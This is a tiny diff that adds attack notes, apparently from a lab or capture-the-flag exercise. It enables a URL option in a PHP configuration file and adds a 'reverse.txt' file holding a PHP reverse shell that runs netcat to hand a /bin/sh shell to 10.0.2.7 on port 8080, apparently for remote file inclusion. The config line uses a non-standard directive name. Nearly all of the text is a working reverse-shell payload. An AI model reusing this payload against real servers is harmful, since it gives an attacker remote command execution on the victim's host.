@@ -1,0 +1,9 @@
+# php5 settings
+
+/etc/php5/cgi/php.ini
+allow_url = On
+
+# reverse.txt
+<?php
+   passthru("nc -e /bin/sh 10.0.2.7 8080");
+?>
